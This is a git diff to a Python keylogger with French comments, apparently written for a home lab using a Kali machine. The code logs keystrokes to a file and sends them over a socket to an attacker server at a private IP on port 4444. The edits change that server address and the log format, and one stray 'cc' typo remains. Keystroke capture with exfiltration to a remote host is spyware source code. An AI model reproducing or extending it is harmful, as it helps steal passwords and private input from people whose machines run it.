@@ -6,19 +6,19 @@ import socket as s  # Pour récupérer le hostname
 import os  # Pour gérer les fichiers
 
 # Adresse et port du serveur (Kali)
-SERVER_IP = "192.168.81.135"  # Remplace par l'adresse IP de ta machine Kali
+SERVER_IP = "192.168.56.1"  # Remplace par l'adresse IP de ta machine Kali
 SERVER_PORT = 4444
 
 # Fichier pour sauvegarder les frappes
-LOG_FILE = "keylogs.txt"
+LOG_FILE = "keylogs.txt" 
 
-# Assure que le fichier existe (ou le crée)
+# Assure que le fichier existe (ou le crée) cc
 if not os.path.exists(LOG_FILE):
     with open(LOG_FILE, "w") as f:
         f.write("=== Keylogger Logs ===\n\n")
 
 # Fonction pour envoyer des données au serveur
-def send_data(data):cc
+def send_data(data):
     try:
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client_socket.connect((SERVER_IP, SERVER_PORT))
@@ -48,7 +48,7 @@ def log_keystroke(key):
 
     # Sauvegarder dans le fichier
     with open(LOG_FILE, "a") as f:
-        f.write(f"{key}") cc
+        f.write(f"{key}\n")
 
     # Préparer les données pour l'envoi au serveur
     keystroke_data = {
